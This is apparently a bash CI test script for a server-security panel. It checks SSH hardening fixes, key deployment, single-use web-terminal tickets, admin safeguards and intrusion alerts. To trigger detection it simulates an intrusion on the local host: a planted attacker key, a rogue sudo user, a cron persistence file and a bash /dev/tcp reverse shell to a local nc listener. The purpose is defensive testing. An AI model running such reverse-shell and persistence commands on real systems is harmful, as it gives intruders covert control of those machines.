#!/usr/bin/env bash
# End-to-end security test on a real Linux host (CI): hardening fixes, SSH keys deployed and used from the panel,
# the web terminal, and intrusion detection. Needs: the server on :8080, a native agent named ci-native installed
# with --allow-actions, SESSION=<admin token>, jq, curl, sshd, passwordless sudo.
set -euo pipefail
API=http://localhost:8080/api
H="authorization: Bearer $SESSION"
J='content-type: application/json'
get()  { curl -fsS "$API$1" -H "$H"; }
post() { local b="${2-}"; [ -n "$b" ] || b='{}'; curl -fsS -X POST "$API$1" -H "$H" -H "$J" -d "$b"; }
put()  { curl -fsS -X PUT "$API$1" -H "$H" -H "$J" -d "$2"; }
code() { local b="${2-}"; [ -n "$b" ] || b='{}'; curl -s -o /tmp/out.json -w '%{http_code}' -X POST "$API$1" -H "$H" -H "$J" -d "$b"; }
ok()   { printf '  \033[32m+\033[0m %s\n' "$*"; }
die()  { printf '  \033[31mFAIL\033[0m %s\n' "$*"; exit 1; }
wait_for() { # wait_for <description> <timeout s> <command...>
  local d="$1" t="$2"; shift 2
  for _ in $(seq 1 "$t"); do if "$@" >/dev/null 2>&1; then ok "$d"; return 0; fi; sleep 1; done
  die "$d (timed out after ${t}s)"
}

ID="$(get /overview | jq '.agents[] | select(.name=="ci-native") | .id')"
test -n "$ID"

echo "== agent capabilities"
wait_for "agent reports canHarden" 60 bash -c "curl -fsS $API/agents/$ID -H '$H' | jq -e '.info.canHarden == true'"

echo "== hardening: findings carry a fix, preview and apply work, sshd stays valid"
sudo ssh-keygen -A >/dev/null 2>&1 || true
sudo mkdir -p /run/sshd
wait_for "a hardening finding with a fix appears" 90 bash -c "curl -fsS $API/agents/$ID -H '$H' | jq -e '[.findings[] | select(.fix != null)] | length > 0'"
get "/agents/$ID" | jq -r '.findings[] | select(.fix != null) | "    \(.severity)\t\(.check_id)\t-> \(.fix)"'
PV="$(post /agents/$ID/fix/preview '{"fix":"ssh.max-auth-tries"}')"
echo "$PV" | jq -e '.title and (.steps | length > 0)' >/dev/null && ok "preview: $(echo "$PV" | jq -r .title)"
post "/agents/$ID/fix" '{"fix":"ssh.max-auth-tries"}' | jq -e '.steps | length > 0' >/dev/null && ok "ssh.max-auth-tries applied"
sudo sshd -T | grep -qx 'maxauthtries 3' && ok "sshd -T reports MaxAuthTries 3"
post "/agents/$ID/fix" '{"fix":"ssh.client-alive"}' >/dev/null && ok "ssh.client-alive applied"
sudo sshd -T | grep -qx 'clientaliveinterval 300' && ok "ClientAliveInterval 300 (settings merge in one drop-in)"
sudo sshd -t && ok "sshd -t still valid"

echo "== ssh: password logins are refused to be switched off without a key"
CODE="$(code "/agents/$ID/fix" '{"fix":"ssh.password-auth","args":{"confirm":true}}')"
if [ "$CODE" = 200 ]; then
  # the runner already had a key; then it must have applied cleanly
  sudo sshd -T | grep -qx 'passwordauthentication no' || die "password-auth reported success but sshd still allows passwords"
  ok "applied (an authorized key already existed)"
else
  jq -e '.error | test("locked out|no account|Refusing")' /tmp/out.json >/dev/null && ok "refused: $(jq -r .error /tmp/out.json | head -c 90)"
fi

echo "== ssh: create a key, deploy it from the panel, test the connection"
sudo systemctl start ssh >/dev/null 2>&1 || sudo systemctl start sshd >/dev/null 2>&1 || true
wait_for "sshd is listening on 22" 20 bash -c "ss -ltn | grep -q ':22 '"
KEY="$(post /ssh/keys '{"name":"ci-key"}')"
KID="$(echo "$KEY" | jq -r .id)"
echo "$KEY" | jq -r .public | grep -q '^ssh-ed25519 ' && ok "generated an Ed25519 key"
get /ssh/keys | jq -e 'map(has("private_enc") or has("private")) | any | not' >/dev/null && ok "the key list never contains private material"
put "/agents/$ID/ssh" "{\"host\":\"127.0.0.1\",\"port\":22,\"user\":\"$USER\",\"keyId\":$KID}" >/dev/null && ok "access saved"
post "/agents/$ID/ssh/deploy" "{\"keyId\":$KID,\"user\":\"$USER\"}" | jq -e '.steps | length > 0' >/dev/null && ok "key deployed to $USER"
AK="/home/$USER/.ssh/authorized_keys"
test "$(stat -c '%a' "$AK")" = 600 && test "$(stat -c '%U' "$AK")" = "$USER" && ok "authorized_keys has 600 and the right owner"
T="$(post "/agents/$ID/ssh/test")"
echo "$T" | jq -e ".ok == true and .user == \"$USER\"" >/dev/null && ok "panel logged in with the key as $T" || die "ssh test failed: $T"
get "/agents/$ID/ssh" | jq -e ".hostKeys.keys | map(select(.user == \"$USER\")) | length > 0" >/dev/null && ok "the host's authorized keys are listed in the panel"

echo "== web terminal over a one-time ticket"
TK="$(post "/agents/$ID/terminal-ticket" | jq -r .ticket)"
OCX_NODE="$(command -v node || echo /opt/node/bin/node)"
NODE_PATH=/opt/oculyx/node_modules "$OCX_NODE" scripts/ci/terminal-test.mjs "ws://localhost:8080/ws/terminal?ticket=$TK" && ok "terminal ran a command and echoed the result"
if NODE_PATH=/opt/oculyx/node_modules "$OCX_NODE" scripts/ci/terminal-test.mjs "ws://localhost:8080/ws/terminal?ticket=$TK" >/dev/null 2>&1; then die "a ticket was accepted twice"; else ok "tickets are single-use"; fi

echo "== keys deployed by the panel are not reported as intruders; others are"
sleep 35
EV="$(get '/events?type=ssh_key_added')"
echo "$EV" | jq -e 'map(select(.message | test("oculyx-ci-key"))) | length == 0' >/dev/null && ok "no alert for the key the panel deployed"
ssh-keygen -q -t ed25519 -N '' -C attacker@evil -f /tmp/evil_key
cat /tmp/evil_key.pub >> "$AK"
wait_for "event ssh_key_added for the key added behind the panel's back" 90 bash -c "curl -fsS $API/events?type=ssh_key_added -H '$H' | jq -e 'map(select(.message | test(\"attacker@evil\"))) | length > 0'"
wait_for "that raised an alert" 20 bash -c "curl -fsS $API/alerts?state=open -H '$H' | jq -e 'map(select(.rule | startswith(\"ssh_key_added\"))) | length > 0'"

echo "== intrusion detection: accounts, privileges, persistence, sudo, reverse shell"
sudo useradd -m ocx-intruder
sudo gpasswd -a ocx-intruder sudo >/dev/null
echo '* * * * * root /bin/true' | sudo tee /etc/cron.d/ocx-evil >/dev/null
(sleep 100 | nc -l 9999 >/dev/null 2>&1 &) ; sleep 1
(bash -c 'exec 3<>/dev/tcp/127.0.0.1/9999; exec sh <&3 >&3 2>&3' >/dev/null 2>&1 &)
for ty in user_created privileged_group_added persistence_changed sudo_suspicious reverse_shell; do
  wait_for "event $ty" 120 bash -c "curl -fsS '$API/events?type=$ty' -H '$H' | jq -e 'length > 0'"
done
get '/alerts?state=open' | jq -r '.[] | "    \(.severity)\t\(.rule)\t\(.message)"' | head -20
for r in user_created privileged_group_added persistence_changed reverse_shell; do
  get '/alerts?state=open' | jq -e "map(select(.rule | startswith(\"$r\"))) | length > 0" >/dev/null && ok "alert $r" || die "no alert for $r"
done

echo "== rules can be switched off"
put /rules/user_removed '{"enabled":false}' >/dev/null
get /rules | jq -e '.rules[] | select(.id=="user_removed") | .enabled == false' >/dev/null && ok "rule switched off"

echo "== undo: remove the SSH changes"
echo "== lockdown wizard: passwords off with a verified key login, then back"
post "/agents/$ID/ssh/lockdown" '{"passwords":true}' | jq -e '.ok == true' >/dev/null && ok "lockdown applied and the key login was re-verified"
sudo sshd -T | grep -qx 'passwordauthentication no' && ok "sshd refuses passwords"
post "/agents/$ID/ssh/test" | jq -e '.ok == true' >/dev/null && ok "key login still works after the lockdown"
post "/agents/$ID/ssh/unlock" '{}' >/dev/null && ok "unlock restored the previous settings"

echo "== administration from the panel: accounts, services, guards"
A="$(get "/agents/$ID/admin")"
echo "$A" | jq -e '.canManage == true and (.users | length > 0) and (.services | length > 0)' >/dev/null && ok "overview lists accounts and services" || die "admin overview failed"
adm() { code "/agents/$ID/admin" "{\"op\":\"$1\",\"args\":$2}"; }
sudo useradd -m -s /bin/bash ocxtest
[ "$(adm user.lock '{"user":"ocxtest"}')" = 200 ] && sudo passwd -S ocxtest | grep -q ' L ' && ok "account locked" || die "admin check failed"
[ "$(adm user.unlock '{"user":"ocxtest"}')" = 200 ] && ok "account unlocked" || die "admin check failed"
[ "$(adm user.sudo '{"user":"ocxtest","enable":true}')" = 200 ] && id -nG ocxtest | grep -qwE 'sudo|wheel|admin' && ok "sudo granted" || die "admin check failed"
[ "$(adm user.sudo '{"user":"ocxtest","enable":false}')" = 200 ] && ok "sudo removed" || die "admin check failed"
[ "$(adm user.delete '{"user":"ocxtest"}')" != 200 ] && ok "deleting needs confirmation" || die "admin check failed"
[ "$(adm user.delete '{"user":"ocxtest","confirm":true}')" = 200 ] && ! id ocxtest >/dev/null 2>&1 && ok "account deleted" || die "admin check failed"
[ "$(adm user.lock "{\"user\":\"$USER\"}")" != 200 ] && ok "the account the panel uses cannot be locked" || die "admin check failed"
[ "$(adm user.lock '{"user":"root"}')" != 200 ] && ok "root is protected" || die "admin check failed"
[ "$(adm svc.stop '{"unit":"ssh.service"}')" != 200 ] && ok "stopping sshd is refused" || die "admin check failed"
[ "$(adm svc.stop '{"unit":"oculyx-agent.service"}')" != 200 ] && ok "the agent cannot stop itself" || die "admin check failed"
[ "$(adm svc.restart '{"unit":"cron.service"}')" = 200 ] && ok "service restart works" || die "admin check failed"
[ "$(adm ip.block '{"ip":"not-an-ip"}')" != 200 ] && ok "invalid IP rejected" || die "admin check failed"
[ "$(adm ip.block '{"ip":"127.0.0.1"}')" != 200 ] && ok "blocking the server itself is refused" || die "admin check failed"
echo "== agent update from the panel"
get "/agents/$ID" | jq -e '.outdated == false' >/dev/null && ok "agent build matches the server (not flagged outdated)" || die "agent flagged outdated right after install"
post "/agents/update" "{\"ids\":[$ID]}" | jq -e '.results[0].ok == true' >/dev/null && ok "update command accepted"
sleep 25
for _ in $(seq 1 40); do get "/agents/$ID" | jq -e '.online == true' >/dev/null 2>&1 && break; sleep 3; done
get "/agents/$ID" | jq -e '.online == true and .outdated == false' >/dev/null && ok "agent came back after updating itself" || die "agent did not come back after the update"
post "/agents/$ID/fix" '{"fix":"ssh.revert"}' >/dev/null && ok "ssh.revert"
test ! -e /etc/ssh/sshd_config.d/00-oculyx.conf && ok "drop-in removed"
sudo userdel -r ocx-intruder 2>/dev/null || true
sudo rm -f /etc/cron.d/ocx-evil
sudo pkill -f '/dev/tcp/127.0.0.1/9999' 2>/dev/null || true
echo "security e2e passed"
